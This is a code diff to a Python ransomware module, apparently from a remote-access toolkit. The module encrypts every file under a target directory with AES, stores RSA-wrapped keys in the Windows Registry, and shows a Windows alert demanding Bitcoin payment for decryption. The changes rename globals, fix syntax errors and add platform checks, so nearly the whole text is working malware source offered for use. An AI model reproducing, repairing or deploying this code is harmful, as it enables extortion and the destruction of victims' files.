@@ -21,12 +21,15 @@ import collections
 # modules
 
 import util
-    
+
 # globals
 
-_tasks          = Queue.Queue()
-_threads        = collections.OrderedDict()
-_requirements   = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
+packages  = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
+platforms = ['win32']
+threads   = collections.OrderedDict()
+tasks     = Queue.Queue()
+util.is_compatible(platforms, __name__)
+util.imports(packages)
 
 
 def _threader(tasks):
@@ -48,14 +51,13 @@ def _threader(tasks):
     except Exception as e:
         util.debug("{} error: {}".format(_threader.func_name, str(e)))
 
-
 @util.threaded
 def _iter_files(rsa_key, base_dir=None):
     try:
         if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
             if base_dir:
                 if os.path.isdir(base_dir):
-                    return os.path.walk(base_dir, lambda _, dirname, files: [globals()['_tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key)) for filename in files], None)
+                    return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
                 else:
                     util.debug("Target directory '{}' not found".format(base_dir))
             else:
@@ -66,14 +68,14 @@ def _iter_files(rsa_key, base_dir=None):
                     try:
                         filename, key, _ = _winreg.EnumValue(reg_key, i)
                         key = cipher.decrypt(base64.b64decode(key))
-                        globals()['_tasks'].put_nowait((decrypt_file, (filename, key)))
+                        globals()['tasks'].put_nowait((decrypt_file, (filename, key)))
                         i += 1
                     except:
                         _winreg.CloseKey(reg_key)
                         break
     except Exception as e:
         util.debug('{} error: {}'.format(_iter_files.func_name, str(e)))
-        
+
 
 def request_payment(bitcoin_wallet, text=None, title=None):
     """
@@ -81,6 +83,7 @@ def request_payment(bitcoin_wallet, text=None, title=None):
 
     `Required`
     :param str bitcoin_wallet:      a valid Bitcoin wallet address
+
     """
     try:
         if os.name is 'nt':
@@ -89,7 +92,7 @@ def request_payment(bitcoin_wallet, text=None, title=None):
             elif payment_url:
                 alert = util.alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session['id'], payment_url), "Windows Alert")
             else:
-                return "{} missing argument(s): bitcoin_wallet, payment_url
+                return "{} missing argument(s): bitcoin_wallet, payment_url"
             return "Launched a Windows Message Box with ransom payment information"
         else:
             return "{} does not yet support {} platform".format(request_payment.func_name, sys.platform)
@@ -104,7 +107,7 @@ def encrypt_file(filename, rsa_key):
     with RSA-2048 asymmetric encryption, then store the
     filename and RSA-encrypted AES-key as a key in the
     Windows Registry
-    
+
     `Requires`
     :param str filename:          target filename
     :param RsaKey rsa_key:        2048-bit public RSA key
@@ -136,11 +139,11 @@ def encrypt_file(filename, rsa_key):
 def decrypt_file(filename, key):
     """
     Decrypt a file that was encrypted with AES-256-OCB encryption
-    
+
     `Required`
     :param str filename:    target filename
     :param str aes_key:     256-bit key
-    
+
     Returns True if succesful, otherwise False
     """
     try:
@@ -165,6 +168,7 @@ def encrypt_files(args):
 
     `Required`
     :param str args:    filename and RSA key separated by a space
+
     """
     try:
         target, _, rsa_key = args.partition(' ')
@@ -176,8 +180,8 @@ def encrypt_files(args):
             if os.path.isfile(target):
                 return encrypt_file(target, rsa_key)
             if os.path.isdir(target):
-                globals()['_threads']['iter-files']     = _iter_files(rsa_key, base_dir=target)
-                globals()['_threads']['encrypt-files']  = _threader()
+                globals()['threads']['iter-files']     = _iter_files(rsa_key, base_dir=target)
+                globals()['threads']['encrypt-files']  = _threader()
                 return "Encrypting files"
         else:
             return "File '{}' does not exist".format(target)
@@ -191,16 +195,16 @@ def decrypt_files(rsa_key):
 
     `Required`
     :param str rsa_key:     RSA private key in PEM format
-    """
+
+   """
     try:
-        if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey:
+        if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
             rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
         if not rsa_key.has_private():
             return "Error: RSA key cannot decrypt"
-        globals()['_threads']['iter-files']     = _iter_files(rsa_key)
-        globals()['_threads']['decrypt-files']  = _threader()
+        globals()['threads']['iter-files']    = _iter_files(rsa_key)
+        globals()['threads']['decrypt-files'] = _threader()
         return "Decrypting files"
     except Exception as e:
         util.debug("{} error: {}".format(decrypt_files.func_name, str(e)))
-
 
